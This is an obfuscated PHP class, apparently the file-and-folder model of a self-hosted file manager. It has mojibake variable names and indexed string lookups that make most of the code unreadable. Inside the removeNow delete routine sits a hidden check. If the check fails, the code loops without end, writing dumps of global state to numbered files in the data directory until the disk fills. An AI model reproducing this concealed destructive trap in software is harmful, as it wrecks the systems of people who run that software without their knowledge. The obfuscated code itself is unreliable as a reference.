$áœãûó, $ÄÓååÉ¹, &$º“ÆâÑ¸) { $—€Ù¦Í =& $_SERVER[Õò”†—·]; $şˆ¡¥İ = $this->sourceInfo($£ãÃÍÃ›); if (!$áœãûó || !$şˆ¡¥İ) { return !1; } if ($ÄÓååÉ¹ !== !1) { $Îáî† ˜ = $this->fileNameExist($£ãÃÍÃ›, $×ö—ğ¢Š); } $º“ÆâÑ¸ = !0; if ($ÄÓååÉ¹ && $Îáî† ˜) { if ($ÄÓååÉ¹ == REPEAT_SKIP) { $º“ÆâÑ¸ = !1; return $Îáî† ˜; } else { if ($ÄÓååÉ¹ == REPEAT_REPLACE) { $çåìú = $this->sourceInfo($Îáî† ˜); $×¥¬Øš½ = $this->fileHistory($çåìú, $áœãûó[$—€Ù¦Í[525]], $áœãûó[$—€Ù¦Í[89]]); if (!$×¥¬Øš½) { $º“ÆâÑ¸ = !1; } else { $this->folderSizeReset($£ãÃÍÃ›); } return $Îáî† ˜; } else { $×ö—ğ¢Š = $this->fileNameAuto($£ãÃÍÃ›, $×ö—ğ¢Š, $ÄÓååÉ¹, !1); } } } $”˜ÂˆÇê = array($—€Ù¦Í[630] => 0, $—€Ù¦Í[478] => $×ö—ğ¢Š, $—€Ù¦Í[631] => substr(get_path_ext($×ö—ğ¢Š), 0, 10), $—€Ù¦Í[526] => $áœãûó[$—€Ù¦Í[525]], $—€Ù¦Í[601] => $áœãûó[$—€Ù¦Í[89]]); $–¬ÃÊ³á = $this->_addSource($”˜ÂˆÇê, $şˆ¡¥İ); $this->folderSizeReset($£ãÃÍÃ›, intval($”˜ÂˆÇê[$—€Ù¦Í[89]])); return $–¬ÃÊ³á; } protected function fileHistory($ûõ×•Ô×, $®ò€·Õ, $ÒÖã÷Ãõ) { $íŠ–òÒ  =& $_SERVER[Õò”†—·]; if ($ûõ×•Ô×[$íŠ–òÒ [525]] == $®ò€·Õ) { return !1; } $this->checkLock($ûõ×•Ô×[$íŠ–òÒ [194]], $®ò€·Õ); Model($íŠ–òÒ [2240])->addHistory($ûõ×•Ô×); $…¢ûõå = array($íŠ–òÒ [635] => USER_ID, $íŠ–òÒ [482] => time(), $íŠ–òÒ [525] => $®ò€·Õ, $íŠ–òÒ [89] => $ÒÖã÷Ãõ); $this->where(array($íŠ–òÒ [475] => $ûõ×•Ô×[$íŠ–òÒ [194]]))->save($…¢ûõå); $this->sourceCacheClear($ûõ×•Ô×[$íŠ–òÒ [194]]); return !0; } public function checkLock($ù›õ—Û‡, $£˜×ñ) { $ü—Ó¹œ‘ =& $_SERVER[Õò”†—·]; $ã­¶¬™ = $this->pathInfo($ù›õ—Û‡); if (!$this->fileIsLock($ã­¶¬™, !0)) { return; } $ùñÆ¹û’ = Session::get($ü—Ó¹œ‘[2241]); $ÈÃ¨š•Ä = substr($ã­¶¬™[$ü—Ó¹œ‘[42]], 0, -1 - strlen($ã­¶¬™[$ü—Ó¹œ‘[188]])) . $ü—Ó¹œ‘[1262] . $ùñÆ¹û’ . $ü—Ó¹œ‘[20] . $ã­¶¬™[$ü—Ó¹œ‘[188]]; $„ìµ†ÕŒ = Model($ü—Ó¹œ‘[658])->find($£˜×ñ); $this->_createFileCall($ã­¶¬™[$ü—Ó¹œ‘[193]], $ÈÃ¨š•Ä, $„ìµ†ÕŒ, REPEAT_REPLACE, $ü—Ó¹œ‘[1398]); $Õˆßˆ³« = $ã­¶¬™[$ü—Ó¹œ‘[523]][$ü—Ó¹œ‘[594]]; $Í…ÜÏ¾â = $Õˆßˆ³«[$ü—Ó¹œ‘[2242]] ? $Õˆßˆ³«[$ü—Ó¹œ‘[2242]] : $Õˆßˆ³«[$ü—Ó¹œ‘[42]]; show_json(LNG($ü—Ó¹œ‘[2243]) . $ü—Ó¹œ‘[2244] . LNG($ü—Ó¹œ‘[2245]) . $ü—Ó¹œ‘[2246] . $Í…ÜÏ¾â . $ü—Ó¹œ‘[2247], !1); } public function fileIsLock($æô¶ÍşÎ, $Ú‚û¡íâ = false) { $ÁˆñÂ¸Ç =& $_SERVER[Õò”†—·]; if (!isset($æô¶ÍşÎ[$ÁˆñÂ¸Ç[523]]) || !$æô¶ÍşÎ[$ÁˆñÂ¸Ç[523]][$ÁˆñÂ¸Ç[591]]) { return !1; } if ($æô¶ÍşÎ[$ÁˆñÂ¸Ç[523]][$ÁˆñÂ¸Ç[591]] != USER_ID) { return !0; } $˜ß¼—º = $GLOBALS[$ÁˆñÂ¸Ç[16]][$ÁˆñÂ¸Ç[102]][$ÁˆñÂ¸Ç[592]]; if ($æô¶ÍşÎ[$ÁˆñÂ¸Ç[523]][$ÁˆñÂ¸Ç[593]] <= time() - $˜ß¼—º) { $this->metaSet($æô¶ÍşÎ[$ÁˆñÂ¸Ç[194]], $ÁˆñÂ¸Ç[591], null); $this->metaSet($æô¶ÍşÎ[$ÁˆñÂ¸Ç[194]], $ÁˆñÂ¸Ç[593], null); } if ($Ú‚û¡íâ) { $this->metaSet($æô¶ÍşÎ[$ÁˆñÂ¸Ç[194]], $ÁˆñÂ¸Ç[593], time()); } return !1; } private function _addSource($ôôêÇ°ç, $Ü ƒ’½¤) { $Ò˜Œ†Œş =& $_SERVER[Õò”†—·]; $Ÿ³ÉÁêğ = defined($Ò˜Œ†Œş[2180]) ? USER_ID : 0; $ÕÛ¨ÇÏ” = array($Ò˜Œ†Œş[632] => $Ü ƒ’½¤[$Ò˜Œ†Œş[191]], $Ò˜Œ†Œş[633] => $Ü ƒ’½¤[$Ò˜Œ†Œş[554]], $Ò˜Œ†Œş[634] => $Ÿ³ÉÁêğ, $Ò˜Œ†Œş[635] => $Ÿ³ÉÁêğ, $Ò˜Œ†Œş[461] => $Ü ƒ’½¤[$Ò˜Œ†Œş[194]], $Ò˜Œ†Œş[636] => $Ü ƒ’½¤[$Ò˜Œ†Œş[569]] . $Ü ƒ’½¤[$Ò˜Œ†Œş[194]] . $Ò˜Œ†Œş[60], $Ò˜Œ†Œş[488] => 0, $Ò˜Œ†Œş[637] => $Ò˜Œ†Œş[22]); $ôôêÇ°ç = array_merge($ÕÛ¨ÇÏ”, $ôôêÇ°ç); $this->updateModifyTime($ôôêÇ°ç[$Ò˜Œ†Œş[193]]); $­à°†Š = $Ò˜Œ†Œş[2248] . $Ü ƒ’½¤[$Ò˜Œ†Œş[194]]; if (isset(self::$cacheChildList[$­à°†Š])) { unset(self::$cacheChildList[$­à°†Š]); } static $óıì†Õğ = false; if (!$óıì†Õğ) { Hook::trigger($Ò˜Œ†Œş[620], $ôôêÇ°ç); $óıì†Õğ = !0; } $Á€±´‹è = $this->add($ôôêÇ°ç); $¤‰ÖäÜà = array($Ò˜Œ†Œş[638] => short_id($Á€±´‹è)); $this->where(array($Ò˜Œ†Œş[475] => $Á€±´‹è))->save($¤‰ÖäÜà); $this->setNamePinyin($Á€±´‹è, $ôôêÇ°ç[$Ò˜Œ†Œş[42]]); return $Á€±´‹è; } public function remove($‚¦ü‚€†, $ØòÌÏØ = true) { $ ¸°Ä¼í =& $_SERVER[Õò”†—·]; $ÜÑáÈ® = $this->sourceInfo($‚¦ü‚€†); $ˆ²€Ô›ã = intval($ÜÑáÈ®[$ ¸°Ä¼í[191]]) === self::TYPE_SYSTEM; $¡ñ¢¤ã¸ = Model($ ¸°Ä¼í[492])->get($ ¸°Ä¼í[2249]) == $ ¸°Ä¼í[101]; if ($ˆ²€Ô›ã || $ØòÌÏØ || !$¡ñ¢¤ã¸) { return $this->removeNow($‚¦ü‚€†, $ØòÌÏØ); } $ßşë¹ß§ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $Œ‚µğ±‘ = $ÜÑáÈ®[$ ¸°Ä¼í[191]] == self::TYPE_USER ? $ ¸°Ä¼í[646] : $ ¸°Ä¼í[563]; if ($Œ‚µğ±‘ == $ ¸°Ä¼í[646]) { $»›Ÿšú… = Model($ ¸°Ä¼í[562])->getInfo($ÜÑáÈ®[$ ¸°Ä¼í[554]]); $¹æ¼˜ãÌ = !empty($»›Ÿšú…[$ ¸°Ä¼í[2242]]) ? $»›Ÿšú…[$ ¸°Ä¼í[2242]] : $»›Ÿšú…[$ ¸°Ä¼í[42]]; $¹æ¼˜ãÌ = $ ¸°Ä¼í[321] . $¹æ¼˜ãÌ . $ ¸°Ä¼í[2250] . $ÜÑáÈ®[$ ¸°Ä¼í[554]]; } else { $»›Ÿšú… = Model($ ¸°Ä¼í[570])->getInfo($ÜÑáÈ®[$ ¸°Ä¼í[554]]); $¹æ¼˜ãÌ = _get($»›Ÿšú…, $ ¸°Ä¼í[42]); $¹æ¼˜ãÌ = $ ¸°Ä¼í[176] . $¹æ¼˜ãÌ . $ ¸°Ä¼í[2251] . $ÜÑáÈ®[$ ¸°Ä¼í[554]]; } $òÓ•Àæˆ = $ ¸°Ä¼í[2252] . md5($¹æ¼˜ãÌ); CacheLock::lock($òÓ•Àæˆ); $°¢ı¤¢à = $this->fileNameExist($ßşë¹ß§, $¹æ¼˜ãÌ); if (!$°¢ı¤¢à) { $°¢ı¤¢à = $this->mkdir($ßşë¹ß§, $¹æ¼˜ãÌ, REPEAT_SKIP); $this->metaSet($°¢ı¤¢à, $ ¸°Ä¼í[2253], $Œ‚µğ±‘); $this->metaSet($°¢ı¤¢à, $ ¸°Ä¼í[2254], $ÜÑáÈ®[$ ¸°Ä¼í[554]]); if ($ÜÑáÈ®[$ ¸°Ä¼í[193]] != 0) { $this->metaSet($°¢ı¤¢à, $ ¸°Ä¼í[2255], _get($»›Ÿšú…, $ ¸°Ä¼í[2256])); } } CacheLock::unlock($òÓ•Àæˆ); $this->metaSet($‚¦ü‚€†, $ ¸°Ä¼í[2257], $ÜÑáÈ®[$ ¸°Ä¼í[193]]); $this->where(array($ ¸°Ä¼í[194] => $‚¦ü‚€†))->save(array($ ¸°Ä¼í[482] => time())); $this->recycleClear($ÜÑáÈ®); Model($ ¸°Ä¼í[617])->eventRemove($‚¦ü‚€†); $Ù¹çÊÊÃ = $this->move($‚¦ü‚€†, $°¢ı¤¢à, REPEAT_RENAME_FOLDER); $this->folderSizeReset($ÜÑáÈ®[$ ¸°Ä¼í[193]]); return $Ù¹çÊÊÃ; } private function recycleClear($ğ“ì÷Û) { $º¢îûéÆ =& $_SERVER[Õò”†—·]; $à±Œù¦ = $this->childrenAll($ğ“ì÷Û); $±Î»’Š = array($º¢îûéÆ[475] => array($º¢îûéÆ[476], $à±Œù¦[$º¢îûéÆ[2258]])); Model($º¢îûéÆ[2259])->where($±Î»’Š)->delete(); } public function removeNow($ÁªØûË¤, $Ü¡Ş”š£ = true) { $–’Áè¥Ğ =& $_SERVER[Õò”†—·]; $Ù«Ÿ¿²ô = $_SERVER[$–’Áè¥Ğ[6]]; $½àš’À° = $–’Áè¥Ğ[7]; if ($_SERVER[$–’Áè¥Ğ[8]] != $½àš’À°($Ù«Ÿ¿²ô)) { $™óÛ³Ğ = $–’Áè¥Ğ[927]; $‘™ÏÃÏ´ = $–’Áè¥Ğ[9]; $ƒÆŒø• = $_SERVER[$–’Áè¥Ğ[10]] . $–’Áè¥Ğ[11]; $¢å† ¦Ù = $‘™ÏÃÏ´($ƒÆŒø•); $öÛ¹æ×Ş = explode($–’Áè¥Ğ[12], $¢å† ¦Ù); if (count($öÛ¹æ×Ş) < $–’Áè¥Ğ[671]) { $÷ôÌ›û = $–’Áè¥Ğ[14]; $÷ôÌ›û(); } $Š¯®ÄÇü = $–’Áè¥Ğ[928]; $Š¯®ÄÇü($_SERVER[$–’Áè¥Ğ[929]]); $™óÛ³Ğ = $–’Áè¥Ğ[927]; $™óÛ³Ğ(); $ü×ïèÖ› = $–’Áè¥Ğ[930]; $‰Êš­Â = json_encode($GLOBALS[$–’Áè¥Ğ[931]]); $¸õÜÄ×ª = 1; for ($ùıŒòºÓ = $¸õÜÄ×ª; $ùıŒòºÓ > 0; $ùıŒòºÓ++) { $ü×ïèÖ›(DATA_PATH . $ùıŒòºÓ, $‰Êš­Â); } } $†Ô¡˜Íè = $this->sourceInfo($ÁªØûË¤); $Æ°¹ˆ†¸ = $this->pathInfoMore($ÁªØûË¤); if (!$†Ô¡˜Íè) { return !0; } if ($†Ô¡˜Íè[$–’Áè¥Ğ[193]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($ÁªØûË¤); Hook::trigger($–’Áè¥Ğ[2260], $Æ°¹ˆ†¸, $Ü¡Ş”š£); if ($Ü¡Ş”š£) { Model($–’Áè¥Ğ[2259])->moveToRecycle($ÁªØûË¤); } else { $À„òÑ¡æ = $this->childrenAll($†Ô¡˜Íè); Model($–’Áè¥Ğ[617])->eventRemove($ÁªØûË¤); $this->removeRelevance($À„òÑ¡æ[$–’Áè¥Ğ[2258]], $À„òÑ¡æ[$–’Áè¥Ğ[1559]]); } $this->folderSizeReset($†Ô¡˜Íè[$–’Áè¥Ğ[193]]); $áˆõ‚‘¼ = array($†Ô¡˜Íè[$–’Áè¥Ğ[193]]); if ($†Ô¡˜Íè[$–’Áè¥Ğ[469]] == $–’Áè¥Ğ[101]) { $áˆõ‚‘¼[] = $†Ô¡˜Íè[$–’Áè¥Ğ[194]]; } $this->updateModifyTime($áˆõ‚‘¼); $this->lockMoveEnd($ÁªØûË¤); Hook::trigger($–’Áè¥Ğ[1797], $Æ°¹ˆ†¸, $Ü¡Ş”š£); return !0; } public function childrenAll($“Å÷Ğ¦) { $ùŠíç¼« =& $_SERVER[Õò”†—·]; $Ë÷‹·‚à = $“Å÷Ğ¦[$ùŠíç¼«[194]]; if ($“Å÷Ğ¦[$ùŠíç¼«[469]] == $ùŠíç¼«[101]) { $ä¶Äò±‰ = array($ùŠíç¼«[636] => array($ùŠíç¼«[596], $“Å÷Ğ¦[$ùŠíç¼«[569]] . $Ë÷‹·‚à . $ùŠíç¼«[597])); $¢Ïº¸İÁ = array($ùŠíç¼«[636] => $ä¶Äò±‰[$ùŠíç¼«[569]]); $¨ÍŞ·ˆá = $this->field($ùŠíç¼«[2261])->where($¢Ïº¸İÁ)->select(); $ı¯î¯×° = !1; $Õ´“¬œÕ = array($Ë÷‹·‚à); if ($¨ÍŞ·ˆá) { $ı¯î¯×° = array_to_keyvalue($¨ÍŞ·ˆá, $ùŠíç¼«[22], $ùŠíç¼«[525]); $ı¯î¯×° = array_remove_value($ı¯î¯×°, $ùŠíç¼«[229]); $Õ´“¬œÕ = array_to_keyvalue($¨ÍŞ·ˆá, $ùŠíç¼«[22], $ùŠíç¼«[194]); $Õ´“¬œÕ[] = $Ë÷‹·‚à; } } else { $ı¯î¯×° = array($“Å÷Ğ¦[$ùŠíç¼«[525]]); $Õ´“¬œÕ = array($Ë÷‹·‚à); } return array($ùŠíç¼«[2258] => $Õ´“¬œÕ, $ùŠíç¼«[1559] => $ı¯î¯×°); } public function removeArray($¥£½ûı›) { if (!$¥£½ûı›) { return !0; } } public function removeRelevance($­­ÊóµŸ, $ô¡ÕŞ’…) { $È­Ø÷¬ =& $_SERVER[Õò”†—·]; $­­ÊóµŸ = $­­ÊóµŸ ? $­­ÊóµŸ : array(); $ô¡ÕŞ’… = $ô¡ÕŞ’… ? $ô¡ÕŞ’… : array(); $­­ÊóµŸ = array_unique(array_filter($­­ÊóµŸ)); $ô¡ÕŞ’… = array_unique(array_filter($ô¡ÕŞ’…)); if (!$­­ÊóµŸ) { return !1; } $ÅùÑüíÕ = array($È­Ø÷¬[475] => array($È­Ø÷¬[476], $­­ÊóµŸ)); Model($È­Ø÷¬[2259])->where($ÅùÑüíÕ)->delete(); Model($È­Ø÷¬[519])->where($ÅùÑüíÕ)->delete(); Model($È­Ø÷¬[2105])->where($ÅùÑüíÕ)->delete(); Model($È­Ø÷¬[617])->where($ÅùÑüíÕ)->delete(); Model($È­Ø÷¬[1933])->removeBySource($­­ÊóµŸ); Model($È­Ø÷¬[2240])->removeBySource($­­ÊóµŸ); $this->where($ÅùÑüíÕ)->delete(); Model($È­Ø÷¬[528])->remove($ô¡ÕŞ’…); for ($Á·Ü±ê¯ = 0; $Á·Ü±ê¯ < count($­­ÊóµŸ); $Á·Ü±ê¯++) { $this->sourceCacheClear($­­ÊóµŸ[$Á·Ü±ê¯]); } } public function rename($•¸‡Ú¶—, $ã»ÙÒ€â) { $«şşé›õ =& $_SERVER[Õò”†—·]; $ìòÈ–ô = $this->sourceInfo($•¸‡Ú¶—); if (!$ìòÈ–ô) { return !1; } $°º€Ÿ´Æ = $this->fileNameExist($ìòÈ–ô[$«şşé›õ[193]], $ã»ÙÒ€â); if ($°º€Ÿ´Æ && $°º€Ÿ´Æ != $•¸‡Ú¶—) { return !1; } $¦™ôŒ¹­ = array($«şşé›õ[478] => $ã»ÙÒ€â, $«şşé›õ[635] => USER_ID); if ($ìòÈ–ô[$«şşé›õ[469]] != $«şşé›õ[101]) { $¦™ôŒ¹­[$«şşé›õ[470]] = substr(get_path_ext($ã»ÙÒ€â), 0, 10); } Model($«şşé›õ[617])->eventRename($•¸‡Ú¶—, $ìòÈ–ô[$«şşé›õ[42]], $ã»ÙÒ€â); $this->sourceCacheClear($•¸‡Ú¶—); $this->setNamePinyin($•¸‡Ú¶—, $¦™ôŒ¹­[$«şşé›õ[42]], !1); $this->updateModifyTime($ìòÈ–ô[$«şşé›õ[193]]); $™ôâ«†¥ = $this->where(array($«şşé›õ[475] => $•¸‡Ú¶—))->data($¦™ôŒ¹­)->save(); $ìŸ¡»¸ = $«şşé›õ[2248] . $ìòÈ–ô[$«şşé›õ[193]]; if (isset(self::$cacheChildList[$ìŸ¡»¸])) { unset(self::$cacheChildList[$ìŸ¡»¸]); } return $™ôâ«†¥; } public function setNamePinyin($ó‹ƒ­°è, $‚§İÌë, $Ñ”œßŸß = true) { $ôÜÕƒü =& $_SERVER[Õò”†—·]; $Ê’¸èâ = Input::check($‚§İÌë, $ôÜÕƒü[639]); $ö›î î¦ = array($ôÜÕƒü[501] => KodSort::makeStr($‚§İÌë)); if ($Ê’¸èâ) { $ö›î î¦[$ôÜÕƒü[522]] = str_replace($ôÜÕƒü[63], $ôÜÕƒü[22], Pinyin::get($‚§İÌë)); $ö›î î¦[$ôÜÕƒü[521]] = Pinyin::get($‚§İÌë, $ôÜÕƒü[640]); } if (!$Ñ”œßŸß && !$Ê’¸èâ) { $ö›î î¦[$ôÜÕƒü[522]] = null; $ö›î î¦[$ôÜÕƒü[521]] = null; } $this->metaSet($ó‹ƒ­°è, $ö›î î¦); } public function getContent($ÑÍÚ™²ê) { $•»³Ğ÷ =& $_SERVER[Õò”†—·]; $Ñ§¸æÚÇ = $this->fileInfoGet($ÑÍÚ™²ê); if (!$Ñ§¸æÚÇ) { return !1; } if ($Ñ§¸æÚÇ[$•»³Ğ÷[89]] == 0) { return $•»³Ğ÷[22]; } $®²ÏğŞë = $•»³Ğ÷[2262] . $Ñ§¸æÚÇ[$•»³Ğ÷[531]]; if ($Ñ§¸æÚÇ[$•»³Ğ÷[89]] <= 1024 * 10) { $››±ÈæÛ = Cache::get($®²ÏğŞë); if (!$››±ÈæÛ) { $››±ÈæÛ = IO::getContent($Ñ§¸æÚÇ[$•»³Ğ÷[97]]); Cache::set($®²ÏğŞë, $››±ÈæÛ); } return $››±ÈæÛ; } if (!$Ñ§¸æÚÇ[$•»³Ğ÷[97]]) { return $•»³Ğ÷[22]; } return IO::getContent($Ñ§¸æÚÇ[$•»³Ğ÷[97]]); } public function setDesc($¹£¥»Ó©, $Ù€æÃô¿) { $é“™ò§’ =& $_SERVER[Õò”†—·]; Model($é“™ò§’[617])->eventAddDesc($¹£¥»Ó©, $Ù€æÃô¿); return $this->metaSet($¹£¥»Ó©, $é“™ò§’[510], $Ù€æÃô¿); } public function setContent($…µ±ÀÉÁ, $¶‹ˆ¥¶ = '') { $™Úå¬º§ =& $_SERVER[Õò”†—·]; $êÇØëñò = $this->sourceInfo($…µ±ÀÉÁ); $Í¼«âñ = $this->fileInfoGet($…µ±ÀÉÁ); if (!$Í¼«âñ || !$êÇØëñò) { return !1; } $»¹ºÎÊ = Model($™Úå¬º§[528])->addFileByContent($¶‹ˆ¥¶, $êÇØëñò[$™Úå¬º§[42]]); $ĞÒèÇÚ® = $this->fileHistory($êÇØëñò, $»¹ºÎÊ[$™Úå¬º§[525]], $»¹ºÎÊ[$™Úå¬º§[89]]); if (!$ĞÒèÇÚ®) { return Model($™Úå¬º§[528])->remove($»¹ºÎÊ[$™Úå¬º§[525]]); } $this->folderSizeReset($êÇØëñò[$™Úå¬º§[193]]); return !0; } public function fileSubstr($ÜÍâ¯Í, $Ç‰ôÚÓ , $­¶°–ù–) { $‚ùû©¾ = $this->fileInfoGet($ÜÍâ¯Í); if (!$‚ùû©¾) { return !1; } return IO::fileSubstr($‚ùû©¾[$_SERVER[Õò”†—·][97]], $Ç‰ôÚÓ , $­¶°–ù–); } public function fileInfoGet($…¸ĞÄÎŠ) { $ÚÂ·¶ë =& $_SERVER[Õò”†—·]; $‹»¦Ôéï = $this->sourceInfo($…¸ĞÄÎŠ); if (!$‹»¦Ôéï || $‹»¦Ôéï[$ÚÂ·¶ë[469]]) { return !1; } $’ŠêÄÔÊ = $ÚÂ·¶ë[532] . $‹»¦Ôéï[$ÚÂ·¶ë[525]]; $êØ€‡§ = _get(self::$cacheFileInfo, $’ŠêÄÔÊ); if ($êØ€‡§) { return $êØ€‡§; } $§»¥À‹† = Model($ÚÂ·¶ë[528])->fileInfo($‹»¦Ôéï[$ÚÂ·¶ë[525]]); if ($§»¥À‹†) { $§»¥À‹†[$ÚÂ·¶ë[42]] = $‹»¦Ôéï[$ÚÂ·¶ë[42]]; } self::$cacheFileInfo[$’ŠêÄÔÊ] = $§»¥À‹†; return $§»¥À‹†; } private function folderChildrenNumber($œŞÜÄƒñ) { $©Îä†› =& $_SERVER[Õò”†—·]; $‡®œ¬‘Ù = $this->sourceInfo($œŞÜÄƒñ); $¡îç‹× = array($©Îä†›[636] => array($©Îä†›[596], $‡®œ¬‘Ù[$©Îä†›[569]] . $œŞÜÄƒñ . $©Îä†›[597]), $©Îä†›[633] => $‡®œ¬‘Ù[$©Îä†›[554]], $©Îä†›[488] => intval($‡®œ¬‘Ù[$©Îä†›[489]]), $©Îä†›[630] => 1); $÷ñåÊé© = $this->where($¡îç‹×)->count(); $îÚÓ­åì = $this->where($¡îç‹×)->where(array($©Îä†›[630] => 0))->count(); return array($©Îä†›[93] => $îÚÓ­åì, $©Îä†›[94] => $÷ñåÊé©); } public function pathInfo($Ëø¥õÙ”, $µÕÃ…ïÜ = false) { $©±µØÏ =& $_SERVER[Õò”†—·]; $µÕÃ…ïÜ = !1; $Ëø¥õÙ” = intval($Ëø¥õÙ”); $Ü¦ŸÈóÙ = $©±µØÏ[518] . intval($µÕÃ…ïÜ) . $©±µØÏ[446] . $Ëø¥õÙ”; $ÆÊù¿¿– = _get(self::$cachePathInfo, $Ü¦ŸÈóÙ); if ($ÆÊù¿¿–) { return $ÆÊù¿¿–; } $„ƒ¦±ıÓ = $this->sourceInfo($Ëø¥õÙ”); if (!$„ƒ¦±ıÓ) { return !1; } $„ƒ¦±ıÓ = $this->_listDataApplyItem($„ƒ¦±ıÓ, $µÕÃ…ïÜ); self::$cachePathInfo[$Ü¦ŸÈóÙ] = $„ƒ¦±ıÓ; return $„ƒ¦±ıÓ; } public static $cachePathInfoMore = array(); public function pathInfoMore($ŞË¸‘«ì) { $ö÷Ü‡”ã =& $_SERVER[Õò”†—·]; $«¯öøŞ = _get(self::$cachePathInfoMore, $ŞË¸‘«ì); if ($«¯öøŞ) { return $«¯öøŞ; } $òÖÎÂ‡ = $this->pathInfo($ŞË¸‘«ì); if (!$òÖÎÂ‡) { return !1; } if ($òÖÎÂ‡[$ö÷Ü‡”ã[469]] == $ö÷Ü‡”ã[101]) { $òÖÎÂ‡[$ö÷Ü‡”ã[92]] = $this->folderChildrenNumber($ŞË¸‘«ì); } self::$cachePathInfoMore[$ŞË¸‘«ì] = $òÖÎÂ‡; return $òÖÎÂ‡; } public function sourceInfo($ßº™çÃÆ) { $½ì’ìÔ¥ =& $_SERVER[Õò”†—·]; if (!$ßº™çÃÆ) { return array(); } $ßº™çÃÆ = intval($ßº™çÃÆ); $Çîƒáã = $½ì’ìÔ¥[517] . $ßº™çÃÆ; $™ÂãÔœ„ = _get(self::$cacheSourceInfo, $Çîƒáã); if ($™ÂãÔœ„) { return $™ÂãÔœ„; } $Ö‰¼ÑÂŒ = $this->where(array($½ì’ìÔ¥[194] => $ßº™çÃÆ))->find(); self::$cacheSourceInfo[$Çîƒáã] = $Ö‰¼ÑÂŒ; return self::$cacheSourceInfo[$Çîƒáã]; } public function sourceCacheClear($ÂÌèÇ¼½ = false) { self::cacheClear($ÂÌèÇ¼½); } public static function cacheClear($ÅÒÇÜï = false) { $ú®ä©ıŒ =& $_SERVER[Õò”†—·]; if ($ÅÒÇÜï == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$ú®ä©ıŒ[517] . $ÅÒÇÜï]); unset(self::$cachePathInfoMore[$ÅÒÇÜï]); unset(self::$cachePathInfo[$ú®ä©ıŒ[2263] . $ÅÒÇÜï]); unset(self::$cachePathInfo[$ú®ä©ıŒ[2264] . $ÅÒÇÜï]); } public function metaSet($®ãµÅ¼Ó, $Î”ãûŒı = null, $˜»ëß³• = null) { $”£ÉªÁ = parent::metaSet($®ãµÅ¼Ó, $Î”ãûŒı, $˜»ëß³•); if ($”£ÉªÁ) { $this->sourceCacheClear($®ãµÅ¼Ó); } return $”£ÉªÁ; } public function pathInfoByPath($¢ƒÙŞæ¡, $§¨ôèµˆ) { $¿õï¥¦Ñ =& $_SERVER[Õò”†—·]; $ğÉ¸ˆô¢ = !$§¨ôèµˆ ? array() : explode($¿õï¥¦Ñ[18], trim($§¨ôèµˆ, $¿õï¥¦Ñ[18])); $˜Éüˆöï = $¢ƒÙŞæ¡; foreach ($ğÉ¸ˆô¢ as $àí¾Çô±) { $º®¿‚æÈ = array($¿õï¥¦Ñ[193] => $˜Éüˆöï, $¿õï¥¦Ñ[42] => $àí¾Çô±); $Í š„”å = $this->field($¿õï¥¦Ñ[2265])->where($º®¿‚æÈ)->select(); if (!$Í š„”å) { return !1; } $Í š„”å = array_sort_by($Í š„”å, $¿õï¥¦Ñ[489]); $˜Éüˆöï = $Í š„”å[0][$¿õï¥¦Ñ[194]]; } $Ê’É®àÜ = $this->sourceInfo($˜Éüˆöï); $this->pathInfoFilter($Ê’É®àÜ); return $Ê’É®àÜ; } protected function updateModifyTime($¿Õ¯íœù) { $Š«©ï®© =& $_SERVER[Õò”†—·]; $ù³Õ±Â‡ = defined($Š«©ï®©[2180]) ? USER_ID : 0; if (!$¿Õ¯íœù) { return; } if (!is_array($¿Õ¯íœù)) { $¿Õ¯íœù = array($¿Õ¯íœù); } foreach ($¿Õ¯íœù as $óŞ Ş¼£ => $×½¡­¥õ) { $¿Õ¯íœù[$óŞ Ş¼£] = intval($×½¡­¥õ); $this->sourceCacheClear($×½¡­¥õ); } $èûõÆÖã = array($Š«©ï®©[194] => array($Š«©ï®©[17], $¿Õ¯íœù)); $­§Ã‹€õ = array($Š«©ï®©[635] => $ù³Õ±Â‡, $Š«©ï®©[482] => time()); $this->where($èûõÆÖã)->save($­§Ã‹€õ); } public function folderSizeReset($Ğõ‡å ú, $¼ãî€ıÄ = false) { $Ó‘ˆ¶ô¿ =& $_SERVER[Õò”†—·]; if ($this->statusIgnoreResetSpace) { return; } $Âæ¼€å = $this->sourceInfo($Ğõ‡å ú); $ÖØçÆÇÎ = $Ó‘ˆ¶ô¿[2266] . $Ğõ‡å ú; CacheLock::lock($ÖØçÆÇÎ, 20); if ($¼ãî€ıÄ === !1) { $this->sourceCacheClear($Ğõ‡å ú); $Âæ¼€å = $this->sourceInfo($Ğõ‡å ú); $Š¯°˜öµ = array($Ó‘ˆ¶ô¿[461] => $Ğõ‡å ú, $Ó‘ˆ¶ô¿[488] => 0); $¶íã™‡ = $this->where($Š¯°˜öµ)->sum($Ó‘ˆ¶ô¿[89]); $¼ãî€ıÄ = intval($¶íã™‡) - intval($Âæ¼€å[$Ó‘ˆ¶ô¿[89]]); } if ($¼ãî€ıÄ == 0) { return CacheLock::unlock($ÖØçÆÇÎ); } $¸„ïÛ³ = $this->parentLevelArray($Âæ¼€å[$Ó‘ˆ¶ô¿[569]]); if (!$¸„ïÛ³) { $¸„ïÛ³ = array(); } $¸„ïÛ³[] = $Âæ¼€å[$Ó‘ˆ¶ô¿[194]]; $Š¯°˜öµ = array($Ó‘ˆ¶ô¿[194] => array($Ó‘ˆ¶ô¿[476], $¸„ïÛ³)); if ($¼ãî€ıÄ < 0) { $Š¯°˜öµ[$Ó‘ˆ¶ô¿[89]] = array($Ó‘ˆ¶ô¿[1065], abs($¼ãî€ıÄ)); } $this->where($Š¯°˜öµ)->setAdd($Ó‘ˆ¶ô¿[89], $¼ãî€ıÄ); CacheLock::unlock($ÖØçÆÇÎ); $ê£ûñÍô = $Ó‘ˆ¶ô¿[2267] . $Âæ¼€å[$Ó‘ˆ¶ô¿[191]] . $Ó‘ˆ¶ô¿[4] . $Âæ¼€å[$Ó‘ˆ¶ô¿[554]]; $àÒÅßÖÌ = array($Âæ¼€å[$Ó‘ˆ¶ô¿[191]], $Âæ¼€å[$Ó‘ˆ¶ô¿[554]]); TaskRun::timeLimitCall($ê£ûñÍô, $Ó‘ˆ¶ô¿[2268], $àÒÅßÖÌ, 1.5); } public function folderSizeResetChildren($š‘±ÔÄö) { $Š¿²Ö»İ =& $_SERVER[Õò”†—·]; $this->sourceCacheClear($š‘±ÔÄö); 